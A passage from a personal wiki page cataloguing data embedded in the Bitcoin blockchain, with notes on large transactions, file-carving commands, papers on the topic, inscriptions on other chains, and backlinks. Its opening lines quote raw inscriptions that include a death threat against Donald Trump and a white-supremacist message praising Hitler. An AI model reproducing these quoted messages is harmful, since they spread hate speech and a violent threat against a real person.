<a id="_1564"></a>
- data/out/0481.txt:11481:I kill donald trump!!!!!!
<a id="_1565"></a>
- data/out/0545.txt:1239:}fEW fuck donald trump
<a id="_1566"></a>
- [tx 05fce37228c732f4635f79e6f36d028be677404beab497ddace9024fe8e4b517](https://github.com/cirosantilli/bitcoin-inscription-indexer/blob/master/data/out/0484.txt#L723) "EW Heil [Trump](#trump)!He's the true white leader our race need so much since [Adolf](continent.md#adolf-hitler)"
<a id="_1567"></a>
- data/out/0552.txt:14:Trump needs to get impeached and locked up!
<a id="_1568"></a>
- data/out/0666.txt:56:(Trump was impeached for the second time in office.

## Interesting transactions

↑ **Parent:** [Cool data embedded in the Bitcoin blockchain](cool-data-embedded-in-the-bitcoin-blockchain.md)

<a id="_1569"></a>
This is about transactions that are interesting not because of their [inscriptions](social-technology.md#inscription-blockchain), but for some other reason, such as transaction size, etc.

<a id="_1570"></a>
Related:<a id="_1571"></a>

<a id="_1572"></a>
- [https://github.com/kristovatlas/interesting-bitcoin-data](https://github.com/kristovatlas/interesting-bitcoin-data)

### The largest transactions in the Bitcoin Blockchain

↑ **Parent:** [Interesting transactions](#interesting-transactions)

<a id="_1573"></a>
[https://bitcoin.stackexchange.com/questions/11542/by-byte-size-and-number-of-inputs-outputs-what-are-the-largest-transactions-in/105384#105384](https://bitcoin.stackexchange.com/questions/11542/by-byte-size-and-number-of-inputs-outputs-what-are-the-largest-transactions-in/105384#105384)

<a id="_1574"></a>
<a id="_1575"></a>
- bb41a757f405890fb0f5856228e23b715702d714d59bf2b1feb70d8b2b4e3e08 999,657 bytes. Joins a bunch of tiny inputs into a single output
<a id="_1576"></a>
- 623463a2a8a949e0590ffe6b2fd3e4e1028b2b99c747e82e899da4485eb0b6be and 5143cf232576ae53e8991ca389334563f14ea7a7c507a3e081fbef2538c84f6e both have 3,075 outputs of 1 satoshi each and a single input. We were not able to identify any meaningful data in it, `file` just says `data`, and there aren't long ASCII strings. However, the outputs were unspent as of 2021, which suggests that they might actually be data.

<a id="_1577"></a>
Analysis of some of them follows.

<a id="_1578"></a>
<a id="_1579"></a>
- dd9f6bbf80ab36b722ca95d93268667a3ea6938288e0d4cf0e7d2e28a7a91ab3 has 13107 with payload 256KB in size, but some of them at least have been spent: [https://www.blockchain.com/btc/tx/dd9f6bbf80ab36b722ca95d93268667a3ea6938288e0d4cf0e7d2e28a7a91ab3](https://www.blockchain.com/btc/tx/dd9f6bbf80ab36b722ca95d93268667a3ea6938288e0d4cf0e7d2e28a7a91ab3) therefore it's not data. `file` says their payload is a DOS executable, but it must be a coincidence

## Bibliography

↑ **Parent:** [Cool data embedded in the Bitcoin blockchain](cool-data-embedded-in-the-bitcoin-blockchain.md)

<a id="_1580"></a>
Other Bitcon analysis:<a id="_1581"></a>

<a id="_1582"></a>
- <a id="_1583"></a>
  "Annotated blockchain project"<a id="_1584"></a>

  <a id="_1585"></a>
  - [https://etherpad.mit.edu/p/r.e33d2e7230fafc0612a0f2e7ebc87bae](https://etherpad.mit.edu/p/r.e33d2e7230fafc0612a0f2e7ebc87bae)
  <a id="_1586"></a>
  - [https://etherpad.mit.edu/p/r.19b7b3e2c5ea08a61cb0bef0aeb213fd](https://etherpad.mit.edu/p/r.19b7b3e2c5ea08a61cb0bef0aeb213fd) image list (February 8, 2017) We tried going over it, but it is just too much work, the huge majority of the results are just [AtomSea & EMBII](#atomsea-and-embii) so not that interesting.
  <a id="_1587"></a>
  - [https://archive.ph/Zz7m5](https://archive.ph/Zz7m5)
  <a id="_1588"></a>
  - [https://www.reddit.com/r/Bitcoin/comments/5wax5v/a_group_is_working_on_building_a_fully_annotated/](https://www.reddit.com/r/Bitcoin/comments/5wax5v/a_group_is_working_on_building_a_fully_annotated/)
  <a id="_1589"></a>
  - [https://archive.4plebs.org/pol/thread/111742853/](https://archive.4plebs.org/pol/thread/111742853/)
  Does the same as this page, just that it is an uncomprehensible mess of broken links. But they have soe good ideas!

  <a id="_1590"></a>
  Their main techniques seem to be:<a id="_1591"></a>

  ```
  mkdir binout
  for file in blk*dat; do echo "$file"; binwalk --dd='.*' "$file" -C binout/. --log=binout/"$file""res.txt"; done
  ```
  and:<a id="_1592"></a>

  ```
  mkdir subfileout
  for file in blk*dat; do mkdir subfileout/"$file"; done
  for file in blk*dat; do echo "$file"; hachoir-subfile --category=image,video,audio,container,archive,misc "$file" subfileout/"$file" > subfileout/"$file""subfile.txt"; done
  ```
  which seem promising.

  <a id="_1593"></a>
  These are installable on Ubuntu 23.10 with:<a id="_1594"></a>

  ```
  sudo apt install binwalk hachoir
  ```

  <a id="_1595"></a>
  TODO how to they automatically map back to transaction IDs? There is a line "Script to add the TX ID to each file." Our attempts: [Section "Get transaction id from position in dat file"](cryptocurrency.md#get-bitcoin-transaction-id-from-position-in-dat-file)

### Hidden surprises in the Bitcoin blockchain by Ken Shirriff (2014)

↑ **Parent:** [Bibliography](#bibliography)

<a id="_1596"></a>
[http://www.righto.com/2014/02/ascii-bernanke-wikileaks-photographs.html](http://www.righto.com/2014/02/ascii-bernanke-wikileaks-photographs.html)

<a id="_1597"></a>
Ken Shirriff is a cool dude, he's done some collabs with [Marc Verdiell](electronics.md#marc-verdiell) in electronics restoration.

### A Quantitative Analysis of the Impact of Arbitrary Blockchain Content on Bitcoin by Matzutt et al. (2018)

↑ **Parent:** [Bibliography](#bibliography)

<a id="_1598"></a>
[https://fc18.ifca.ai/preproceedings/6.pdf](https://fc18.ifca.ai/preproceedings/6.pdf)

<a id="_1599"></a>
Semi-boring [academic](education.md#academia) overview, but without reproducibility, or in a way that is too hidden for Ciro to have the patience to find it out.

<a id="_1600"></a>
Claims 1600 files found.

<a id="_1601"></a>
Mentions some upload mechanisms, notably [AtomSea & EMBII](#atomsea-and-embii) and [Satoshi uploader](cryptocurrency.md#satoshi-uploader).

### Messages from the mines

↑ **Parent:** [Bibliography](#bibliography)

<a id="_1602"></a>
[https://messagesfromthemines.brangerbriz.com](https://messagesfromthemines.brangerbriz.com)

<a id="_1603"></a>
Down as of 2025, and because it was a dynamic mess [Wayback Machine](website.md#wayback-machine) shows nothing.

### Bitcoin Burn Addresses: Unveiling the Permanent Losses and Their Underlying Causes

↑ **Parent:** [Bibliography](#bibliography)

<a id="_1605"></a>
[https://arxiv.org/pdf/2503.14057](https://arxiv.org/pdf/2503.14057)

<a id="_1606"></a>
By Mohamed el Khatib and Arnaud Legout.

<a id="_1607"></a>
Both autors were at [Inria Centre at Université Côte d'Azur](research-institute.md#inria-centre-at-universite-cote-d-azur), Mohamed the intern and Arnaud the Inria researcher employee.

<a id="_1608"></a>
Cool, this method could reveal novel [P2FKH](cryptocurrency.md#fake-p2pkh-address) images:<a id="_1609"></a>


> We propose a methodology to automatically detect burn addresses. We manually classified

208,656 addresses suspected to be burn addresses because they have a low Shannon entropy<a id="_1610"></a>


> Our model identified 7,905 true burn addresses from a pool of 1,283,997,050 addresses with only 1,767 false positive.

Unfortunately their method might not be well suited for finding images, later on:<a id="_1611"></a>


> Storing images for fun and posterity. We did not observe plain text messages encoded in Bech32 addresses. As our methodology is designed to identify burn addresses with a human-readable structure or easily identifiable patterns, we are not supposed to detect images encoded in burn addresses.

<a id="_1612"></a>
Data for their results can be found at:

<a id="_1613"></a>
<a id="_1614"></a>
- [https://github.com/cirosantilli/bitcoin-inscription-indexer#low-entropy-addresses-khatib-legout-csv](https://github.com/cirosantilli/bitcoin-inscription-indexer#low-entropy-addresses-khatib-legout-csv)
<a id="_1615"></a>
- [https://github.com/cirosantilli/bitcoin-inscription-indexer/blob/master/data-manual/low-entropy-addresses-khatib-legout.csv](https://github.com/cirosantilli/bitcoin-inscription-indexer/blob/master/data-manual/low-entropy-addresses-khatib-legout.csv)

## Other blockchains

↑ **Parent:** [Cool data embedded in the Bitcoin blockchain](cool-data-embedded-in-the-bitcoin-blockchain.md)

<a id="_1616"></a>
<a id="_1617"></a>
- [Namecoin](https://ourbigbook.com/go/topic/namecoin)<a id="_1618"></a>

  <a id="_1619"></a>
  - [https://nmc.vision/](https://nmc.vision/) by [https://x.com/punk3606](https://x.com/punk3606) is basically the same as this project but for Namecoin: the dude is trying to make database with all namecoin inscriptions ever.
  <a id="_1620"></a>
  - <a id="_1621"></a>
    "Quantum" is an image created by artists Jennifer and Kevin McCoy which Kevin embedded on [Namecoin](https://ourbigbook.com/go/topic/namecoin) in 2014. As such, it is a relatively early example of [inscription](social-technology.md#inscription-blockchain). On June 2021 it sold for more than one million dollars at an [auction at Sotheby's](https://www.sothebys.com/en/buy/auction/2021/natively-digital-a-curated-nft-sale-2/quantum) to NFT collector [sillytuna](https://x.com/sillytuna). Bibliography:<a id="_1622"></a>

    <a id="_1623"></a>
    - [https://nftnow.com/art/quantum-the-first-piece-of-nft-art-ever-created/](https://nftnow.com/art/quantum-the-first-piece-of-nft-art-ever-created/)

    <a id="_1624"></a>
    ![](https://web.archive.org/web/20240416163318/https://sothebys-md.brightspotcdn.com/dims4/default/e598dd0/2147483647/strip/true/crop/1280x1280+0+0/resize/385x385!/quality/90/?url=http%3A%2F%2Fsothebys-brightspot.s3.amazonaws.com%2Fmedia-desk%2F5a%2Fcf%2F91ff8b7e484eb6d1e765a2a9a14d%2Fmccoy-quantum-still.jpeg)
<a id="_1625"></a>
- [Ethereum](cryptocurrency.md#ethereum)<a id="_1626"></a>

  <a id="_1627"></a>
  - [https://reidjs.medium.com/top-6-weird-innovative-and-hilarious-findings-in-the-ethereum-blockchain-83dbbca461ca](https://reidjs.medium.com/top-6-weird-innovative-and-hilarious-findings-in-the-ethereum-blockchain-83dbbca461ca) Top 6 Weird, Innovative, and Hilarious findings in the Ethereum Blockchain by Reid Sherman (2018)
  <a id="_1628"></a>
  - [https://www.ethereumhistory.com](https://www.ethereumhistory.com) dude is reverse engineering some early contracts. It is cool that in Ethereum, every contract is something that you can reverse engineer. Announced e.g. at: [https://www.reddit.com/r/ethereum/comments/1ro4bt9/ive_been_reverseengineering_ethereums_earliest/](https://www.reddit.com/r/ethereum/comments/1ro4bt9/ive_been_reverseengineering_ethereums_earliest/)
<a id="_1629"></a>
- [Monero](cryptocurrency.md#monero): as of January 2024, Ciro downloaded the blockchain and `strings -n20 -s` didn't seem to have not even a single [ASCII art](#ascii-art), it is quite sad. Bibliography:<a id="_1630"></a>

  <a id="_1631"></a>
  - [https://monero.stackexchange.com/questions/3066/is-it-possible-to-embed-message-for-recipient-in-transaction](https://monero.stackexchange.com/questions/3066/is-it-possible-to-embed-message-for-recipient-in-transaction)
  <a id="_1632"></a>
  - [https://www.mordinals.io/](https://www.mordinals.io/)
  <a id="_1633"></a>
  - [https://moneropunks.com/](https://moneropunks.com/)
  <a id="_1634"></a>
  - [https://github.com/noncesense-research-lab/monero_tx_extra/blob/master/ascii_data.md](https://github.com/noncesense-research-lab/monero_tx_extra/blob/master/ascii_data.md)

## Incoming links

↑ **Parent:** [Cool data embedded in the Bitcoin blockchain](cool-data-embedded-in-the-bitcoin-blockchain.md)

<a id="_1635"></a>
By [Ciro Santilli](ciro-santilli.md):<a id="_1636"></a>

<a id="_1637"></a>
- 2021-04-13 [https://twitter.com/cirosantilli/status/1382067162492366854](https://twitter.com/cirosantilli/status/1382067162492366854): main initial announcement on [Twitter](social-technology.md#twitter). [https://twitter.com/mikko](https://twitter.com/mikko), who has 209.9K followers and a [Wikipedia](website.md#wikipedia) page: [Mikko Hypponen](https://en.wikipedia.org/wiki/Mikko_Hyppönen) hearted the tweet s2
<a id="_1638"></a>
- 2023-01-21 [https://twitter.com/cirosantilli/status/1749172304259535063](https://twitter.com/cirosantilli/status/1749172304259535063): improvements to the [Prayer wars](#prayer-wars)
<a id="_1639"></a>
- 2024-02-07 [https://twitter.com/cirosantilli/status/1755378931446739373](https://twitter.com/cirosantilli/status/1755378931446739373): large-ish update with new items and improved organization
<a id="_1640"></a>
- 2024-03-31 [https://twitter.com/cirosantilli/status/1774531934305071295](https://twitter.com/cirosantilli/status/1774531934305071295): binwalk discoveries, start poking a bit into [ordinal ruleset inscriptions](#ordinal-ruleset-inscription)
<a id="_1641"></a>
- 2024-04-04 [https://twitter.com/cirosantilli/status/1775805941885108392](https://twitter.com/cirosantilli/status/1775805941885108392): [largest text ordinal inscription](#largest-text-ordinal-inscription)

<a id="_1642"></a>
By others:<a id="_1643"></a>

<a id="_1644"></a>
- 2021-04-15 [https://news.ycombinator.com/item?id=26801067](https://news.ycombinator.com/item?id=26801067) (96 points) on [Hacker News](website.md#hacker-news). Reached position 16 at one point: [https://archive.ph/L0Fte](https://archive.ph/L0Fte) and led to about 5k views total. Ah, Ciro could watch that [Google Analytics](google.md#google-analytics) realtime view go bling all day long. [Narcissism](brain.md#narcissism) is a bitch.
<a id="_1645"></a>
- 2021 [https://cryptonewmedia.press/tankman-image-on-bitcoin-blockchain/](https://cryptonewmedia.press/tankman-image-on-bitcoin-blockchain/) by user igadjeed
<a id="_1646"></a>
- 2022-01-23 [https://news.ycombinator.com/item?id=30050479](https://news.ycombinator.com/item?id=30050479) "Abuse and Harassment on the Blockchain", comment-mid thread
<a id="_1647"></a>
- 2022-01-24 [https://www.reddit.com/r/Buttcoin/comments/sbw0se/when_i_heard_about_nfts_i_thought_they_were/hu2uk8g](https://www.reddit.com/r/Buttcoin/comments/sbw0se/when_i_heard_about_nfts_i_thought_they_were/hu2uk8g) "When I heard about NFTs, I thought they were stupid, but then I watched a video explaining how they work, it really changed my perspective", comment mid-thread
<a id="_1648"></a>
- 2023-02 lots of [Twitter](social-technology.md#twitter) backlinks as a result of [ordinal ruleset inscriptions](#ordinal-ruleset-inscription):<a id="_1649"></a>

  <a id="_1650"></a>
  - <a id="_1651"></a>
    2023-02-03

    <a id="video-bitcoin-free-speech-repository-by-trader-university-2023"></a>
    **[Video 7](#video-bitcoin-free-speech-repository-by-trader-university-2023). Bitcoin= Free Speech Repository? by Trader University (2023)** [Source](https://youtu.be/DOKwJ2T-Bf0?t=132). Features [Marijuana plant](#marijuana-plant) and [Rickrolling](#rickrolling) sections. He seems to be a [finance guru](economy.md#finance-guru).
  <a id="_1652"></a>
  - 2023-02-07 [https://twitter.com/privateid_ntity/status/1622814063331004421](https://twitter.com/privateid_ntity/status/1622814063331004421)
<a id="_1653"></a>
- 2024-01-18 [https://twitter.com/pete_rizzo_/status/1748049913286447355](https://twitter.com/pete_rizzo_/status/1748049913286447355) by Rizzo, [The Bitcoin Historian](https://ourbigbook.com/go/topic/the-bitcoin-historian) (81k followers, mid-thread)
<a id="_1654"></a>
- 2024-12-29: [https://x.com/lopp/status/1873453363523932630](https://x.com/lopp/status/1873453363523932630) by [Jameson Lopp](https://ourbigbook.com/go/topic/jameson-lopp) (492k subscribers)
<a id="_1655"></a>
- ? [https://cloudhiker.net/](https://cloudhiker.net/) A hand curated and categorized list of interesting links by Kevin Woblick. Only allows users to visit a random one per category, so we can't get proof of backlink, this was noticed through [Google Analytics](google.md#google-analytics).
<a id="_1656"></a>
- 2025-03-18 [Bitcoin Burn Addresses: Unveiling the Permanent Losses and Their Underlying Causes](#bitcoin-burn-addresses-unveiling-the-permanent-losses-and-their-underlying-causes)  
  The mention of this project is brief:<a id="_1657"></a>
  > Ciro Santilli maintains a Web page listing arbitrary data embedded in the Bitcoin blockchain. This is the most complete and up-to-date list of arbitrary data we are aware of. However, he does not specifically focus on burn addresses, but on the stored contents.

  Announced at:<a id="_1658"></a>

  <a id="_1659"></a>
  - [https://mastodon.social/@cirosantilli/114196089446001434](https://mastodon.social/@cirosantilli/114196089446001434)
  <a id="_1660"></a>
  - [https://x.com/cirosantilli/status/1902784226896019512](https://x.com/cirosantilli/status/1902784226896019512)
  <a id="_1661"></a>
  - [https://x.com/cirosantilli/status/1904211594000715781](https://x.com/cirosantilli/status/1904211594000715781)
<a id="_1662"></a>
- 2025-03-28 [https://x.com/punk3606/status/1905295370227155344](https://x.com/punk3606/status/1905295370227155344) quick "this was already discovered" mention on thread [https://x.com/I____felix____I/status/1905291048798106061](https://x.com/I____felix____I/status/1905291048798106061) where a dude rediscovers [Figure 5. "Warren Buffet"](#image-warren-buffet)
<a id="_1663"></a>
- 2025-07-20 [https://www.youtube.com/watch?v=oFrK2tpat8c](https://www.youtube.com/watch?v=oFrK2tpat8c) Uncovering Hidden Messages in Bitcoin by Th3M0rn1ng5h0w

## 🏷️ Tagged (1)

- [New Bitcoin Base58 messages found due to a new paper: Bitcoin Burn Addresses: Unveiling the Permanent Losses and Their Underlying Causes](updates.md#new-bitcoin-base58-messages-found-due-to-a-new-paper-bitcoin-burn-addresses-unveiling-the-permanent-losses-and-their-underlying-causes)

## ↑ Ancestors (10)

1. [Bitcoin inscription](cryptocurrency.md#bitcoin-inscription)
2. [Bitcoin](cryptocurrency.md#bitcoin)
3. [List of cryptocurrencies](cryptocurrency.md#list-of-cryptocurrencies)
4. [Cryptocurrency](cryptocurrency.md)
5. [Blockchain](social-technology.md#blockchain)
6. [Money](social-technology.md#money)
7. [Social technology](social-technology.md)
8. [Area of technology](technology.md#area-of-technology)
9. [Technology](technology.md)
10. [Ciro Santilli's Homepage](README.md)

## ← Incoming links (11)

- [Ciro Santilli's Homepage](README.md)
- [The best articles by Ciro Santilli](articles.md)
- [Backward design](cirism.md#backward-design)
- [Bitcoin Inscription Indexer](cryptocurrency.md#bitcoin-inscription-indexer)
- [Exams and homework are useless, only projects matter](how-to-teach.md#exams-and-homework-are-useless-only-projects-matter)
- [Inscription (blockchain)](social-technology.md#inscription-blockchain)
- [kenorb](stack-overflow.md#kenorb)
- [1000 Monero donation](sponsor.md#1000-monero-donation)
- [Getting a list of all currencies from Wikidata with SPARQL](updates.md#getting-a-list-of-all-currencies-from-wikidata-with-sparql)
- [Introductory video for Bitcoin inscription museum](updates.md#introductory-video-for-bitcoin-inscription-museum)
- [New Bitcoin Base58 messages found due to a new paper: Bitcoin Burn Addresses: Unveiling the Permanent Losses and Their Underlying Causes](updates.md#new-bitcoin-base58-messages-found-due-to-a-new-paper-bitcoin-burn-addresses-unveiling-the-permanent-losses-and-their-underlying-causes)
